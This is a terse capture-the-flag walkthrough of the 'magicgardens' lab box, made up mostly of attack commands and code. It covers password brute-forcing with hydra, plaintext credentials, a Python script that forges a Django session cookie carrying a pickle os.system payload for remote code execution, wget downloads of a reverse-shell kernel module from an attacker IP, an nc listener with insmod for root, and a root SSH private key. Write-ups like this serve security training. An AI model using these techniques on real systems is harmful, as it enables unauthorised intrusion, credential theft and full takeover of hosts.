hosts: magicgardens.htb



# User and root

## when we purchase item with subscription role we get a message from morty asking for qrcode

## brutefoce the site with hydra rockyou.txt we can find morty creds, and can be use to ssh into the box

## from /etc/passwd we bruteforce basic auth of the docker registry on https://IP:5000/v2/_catalog and we found alex:diamonds work



Credentials:

alex:diamonds

morty:jonasbrothers



## list tags

$ curl https://alex:diamonds@BOX_IP:5000/v2/magicgardens.htb/tags/list -k

{"name":"magicgardens.htb","tags":["1.3"]}



## put this in /etc/docker/daemon.json

{

  "insecure-registries" : ["BOX_IP:5000"]

}



## pull the image

$ sudo docker pull BOX_IP:5000/magicgardens.htb:1.3

$ sudo docker run -it BOX_IP:5000/magicgardens.htb:1.3 /bin/bash



## Django secret key to rce

```

import os

import base64

import django

from django.conf import settings

import django.core.signing

import pickle



# Configure Django settings

settings.configure(

    SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b',

)



django.setup()



salt = "django.contrib.sessions.backends.signed_cookies"



class PickleSerializer:

    """

    Simple wrapper around pickle to be used in signing.dumps and

    signing.loads.

    """



    def dumps(self, obj):

        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)



    def loads(self, data):

        return pickle.loads(data)



class Command:

    def __reduce__(self):

        return (os.system, ('your reverse shell command',))



cookie = django.core.signing.dumps(

    Command(), key=settings.SECRET_KEY, salt=salt, serializer=PickleSerializer)

print(cookie)

```

python3 script.py

## copy the cookie and set it to sessionid then visit http://magicgardens.htb/admin/



## linpeas show we have CAP_SYS_MODULE capabilities

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

ssh morty@magicgardens.htb

password: jonasbrothers



morty@magicgardens:~$ wget http://IP/reverse-shell.c; wget http://IP/Makefile



morty@magicgardens:~$ make

make -C /lib/modules/6.1.0-20-amd64/build M=/home/morty modules

make[1]: Entering directory '/usr/src/linux-headers-6.1.0-20-amd64'

  CC [M]  /home/morty/reverse-shell.o

  MODPOST /home/morty/Module.symvers

  CC [M]  /home/morty/reverse-shell.mod.o

  LD [M]  /home/morty/reverse-shell.ko

  BTF [M] /home/morty/reverse-shell.ko



# upload the compiled kernel module (reverse-shell.ko) to the container

# start listener and load the module in the container

nc -vlnp 4444

insmod reverse-shell.ko



ssh -i root.key root@magicgardens.htb



-----BEGIN OPENSSH PRIVATE KEY-----

b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn

NhAAAAAwEAAQAAAIEAsyXq6mfyWfzHMRdLtAPytpPckxE8mcuf7Nunf9o+gwQg3h/B9N+L

cWZTlmHCSmvDnFFfH9nTEG7ZGBntVpEAOAuWRYojNAFvYSvrDQMMRO/ErPSEFTmkKQtJdt

ac0Xfs2aGHPpO9JdeNskgC3yQwv+8eLHNqXNTRtzGirD87PbsAAAII1XMGntVzBp4AAAAH

c3NoLXJzYQAAAIEAsyXq6mfyWfzHMRdLtAPytpPckxE8mcuf7Nunf9o+gwQg3h/B9N+LcW

ZTlmHCSmvDnFFfH9nTEG7ZGBntVpEAOAuWRYojNAFvYSvrDQMMRO/ErPSEFTmkKQtJdtac

0Xfs2aGHPpO9JdeNskgC3yQwv+8eLHNqXNTRtzGirD87PbsAAAADAQABAAAAgQCV4gB0E3

mZPjqtYM8ukisMBBOEW+R2y/1GXtP5zO+GD/srvCg7Jph0zObcJ3g1aYnkC9RpQoYq9oLd

fjuqtHAYDVzTDoZHfc3BJC15iw7KoQiOXsrbO8P8aLomYbfiLgPsf0E3aARKjEX44j+ELv

2SPzhL1WHRAfu13Nbvf7ha6QAAAEAK83MYwkGkatXHuVEBjQuVKiJDr1A9IgDoGQ3/WVTu

NNm57te2HnQuqK8CTxMOE6CiPXoEwO4UUgzVOXbNBbieAAAAQQDc6qe4ez2iTRZ0WoEfe9

heXP2ikBgn+JBeSmMYd5EHtMScCmBS06ooqnfAnaP6P2Y0AA4LeWIGYkI/PxyOqgVVAAAA

QQDPmSrwc1bYM6tzvwDS0LYmibNUPpQh/eFPoUTs7AHErvpLve5Grygd38N5zWuKYA2xv9

NZtR9pU8HLUhC8HTbPAAAAEXJvb3RAbWFnaWNnYXJkZW5zAQ==

-----END OPENSSH PRIVATE KEY-----

"""